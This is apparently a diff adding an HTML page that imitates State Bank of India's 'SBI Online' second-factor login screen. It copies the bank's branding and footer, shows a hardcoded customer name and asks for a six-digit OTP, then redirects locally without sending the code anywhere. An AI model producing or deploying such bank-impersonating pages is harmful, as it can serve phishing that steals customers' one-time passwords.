@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+            <style>
+</style>
+        </head>
+        <body>
+            
+
+
+
+            <style>.lw { font-size: 60px; }
+</style>
+        
+        
+            
+
+
+<meta charset="UTF-8">
+<title>SBI Online - Login Second Factor Authentication</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+        font-family: Verdana, Arial, sans-serif;
+        background-color: #ffffff;
+        margin: 0;
+        padding: 0;
+        color: #333;
+    }
+    .header {
+        background-color: #fff;
+        border-bottom: 4px solid #0072CE;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 40px;
+    }
+    .header img {
+        height: 50px;
+    }
+    .nav {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        font-size: 13px;
+    }
+    .nav a {
+        text-decoration: none;
+        color: #333;
+    }
+    .nav .btn-pill {
+        padding: 5px 10px;
+        border-radius: 4px;
+        color: #fff;
+        text-decoration: none;
+        font-size: 13px;
+    }
+    .nav .prod { background-color: #7B1FA2; }
+    .nav .help { background-color: #F06292; }
+    .logout {
+        background-color: #D9534F;
+        color: #fff;
+        border: none;
+        padding: 6px 12px;
+        border-radius: 4px;
+        font-weight: bold;
+        font-size: 13px;
+        cursor: pointer;
+    }
+
+    .timestamp-bar {
+        background-color: #fff;
+        padding: 8px 40px;
+        font-size: 13px;
+        font-weight: bold;
+        border-bottom: 1px solid #ccc;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    #timestamp {
+        white-space: nowrap;
+    }
+    .welcome-box {
+        font-weight: normal;
+        font-size: 18px;
+    }
+    .welcome-box span {
+        font-weight: bold;
+    }
+    .welcome-box input {
+        border: none;
+        border-bottom: 1px dotted #999;
+        background: transparent;
+        font-size: 13px;
+        font-family: inherit;
+        padding: 1px 3px;
+        min-width: 120px;
+    }
+    .welcome-box input:focus {
+        outline: none;
+        border-bottom-style: solid;
+    }
+
+    .auth-container {
+        width: 720px;
+        margin: 25px auto 0;
+        background-color: #E8F4F8;
+        border: 1px solid #ccc;
+        padding: 20px 40px 30px;
+    }
+    h3 {
+        margin-top: 0;
+        margin-bottom: 15px;
+        color: #004A8F;
+    }
+    .auth-container hr {
+        border: none;
+        border-top: 1px solid #ccc;
+        margin: 0 0 15px;
+    }
+    .auth-container p {
+        margin: 5px 0;
+        font-size: 13px;
+    }
+    .note {
+        color: #D9534F;
+        font-size: 11px;
+        margin-bottom: 15px;
+    }
+    label {
+        font-size: 13px;
+        font-weight: bold;
+    }
+    input[type="text"]#otp {
+        width: 260px;
+        padding: 5px;
+        margin: 8px 0 15px;
+        font-size: 13px;
+        border: 1px solid #ccc;
+        border-radius: 3px;
+    }
+    .btn-submit {
+        background-color: #FFA500;
+        color: #fff;
+        border: none;
+        padding: 6px 20px;
+        font-weight: bold;
+        font-size: 13px;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-left: 5px;
+    }
+    .btn-resend {
+        background-color: #00796B;
+        color: #fff;
+        border: none;
+        padding: 6px 18px;
+        border-radius: 4px;
+        font-weight: bold;
+        font-size: 12px;
+        cursor: pointer;
+        margin-left: 5px;
+    }
+
+    .footer-note {
+        width: 100%;
+        background-color: #FAF3DC;
+        padding: 15px 80px 20px;
+        font-size: 12px;
+        border-top: 1px solid #ddd;
+        box-sizing: border-box;
+        margin-top: 25px;
+    }
+    .footer-note ul {
+        margin: 0;
+        padding-left: 18px;
+    }
+    .footer {
+        background-color: #f8f8f8;
+        padding: 10px 40px;
+        font-size: 11px;
+        border-top: 1px solid #ccc;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+    }
+    .footer a {
+        text-decoration: none;
+        color: #004A8F;
+    }
+</style>
+
+
+
+<div class="header">
+    <!-- replace src with your logo path -->
+    <img src="images/sbionline.png" alt="SBI Online">
+    <div class="nav">
+        <a href="#">About OnlineSBI</a>
+        <a href="#">Registration Forms</a>
+        <a href="#" class="btn-pill prod">Products &amp; Services</a>
+        <a href="#" class="btn-pill help">How do I (Help)</a>
+        <button class="logout" id="logoutBtn">LOGOUT</button>
+    </div>
+</div>
+
+<div class="timestamp-bar">
+    <span id="timestamp">21-Dec-2025 [10:34 AM IST]</span>
+    <div class="welcome-box">
+        Welcome Royal Groups &amp; Co <span></span>
+        
+    </div>
+</div>
+
+<div class="auth-container">
+    <h3>Login Second Factor Authentication</h3>
+    <hr>
+    <p><strong>Enter the One Time Password sent to your mobile phone</strong></p>
+    <p class="note">Mandatory fields are marked with an asterisk (*)</p>
+
+    <form id="otpForm">
+        <label for="otp">One Time Password *</label><br>
+        <input type="password" id="otp" name="otp" maxlength="6">
+        <button type="submit" class="btn-submit">Submit</button>
+    </form>
+
+    <p>
+        If you did not receive the High Security Password on SMS, you can
+        <button class="btn-resend" type="button" id="resendBtn">
+            Click here to resend the OTP
+        </button>
+    </p>
+</div>
+
+<div class="footer-note">
+    <ul>
+        <li>Please note that all communication related to Internet banking will be sent on your registered mobile number.</li>
+        <li>State Bank or any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report.phishing@sbi.co.in if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials.</li>
+    </ul>
+</div>
+
+<div class="footer">
+    <a href="#">Privacy Statement</a>
+    <a href="#">Disclosure</a>
+    <a href="#">Terms of Service (Terms &amp; Conditions)</a>
+    <a href="#">Site Map</a>
+</div>
+
+<script>
+    // --- IST timestamp generator ---
+    function updateTimestamp() {
+        const now = new Date();
+        // convert local time to UTC then to IST (UTC + 5:30)
+        const utcMillis = now.getTime() + (now.getTimezoneOffset() * 60000);
+        const istMillis = utcMillis + (5.5 * 60 * 60 * 1000);
+        const istDate = new Date(istMillis);
+
+        const day = String(istDate.getDate()).padStart(2, '0');
+        const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
+                            "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+        const month = monthNames[istDate.getMonth()];
+        const year = istDate.getFullYear();
+
+        let hours = istDate.getHours();
+        const minutes = String(istDate.getMinutes()).padStart(2, '0');
+        const ampm = hours >= 12 ? "PM" : "AM";
+        hours = hours % 12;
+        if (hours === 0) hours = 12;
+
+        const timeString = hours + ":" + minutes + " " + ampm;
+        document.getElementById("timestamp").textContent =
+            day + "-" + month + "-" + year + " [" + timeString + " IST]";
+    }
+
+    // --- OTP form validation and redirects ---
+    document.getElementById("otpForm").addEventListener("submit", function (e) {
+        e.preventDefault();
+        const otp = document.getElementById("otp").value.trim();
+        const otpRegex = /^\d{6}$/;   // exactly 6 digits
+
+        if (otpRegex.test(otp)) {
+            // valid 6-digit OTP
+            window.location.href = "yono.html";
+        } else {
+            alert("Please enter a 6-digit One Time Password.");
+        }
+    });
+
+    // --- Logout redirect ---
+    document.getElementById("logoutBtn").addEventListener("click", function () {
+        window.location.href = "login.html";
+    });
+
+    // (Optional) Resend OTP button – you can add real logic later
+    document.getElementById("resendBtn").addEventListener("click", function () {
+        alert("OTP resend request submitted.");
+    });
+
+    // initial timestamp + refresh every minute
+    updateTimestamp();
+    setInterval(updateTimestamp, 60000);
+</script>
+
+
+
+
+            <script>// Write JavaScript here</script>
+        
+    
+
+            <script>// Write JavaScript here</script>
+        
+    
+</body>
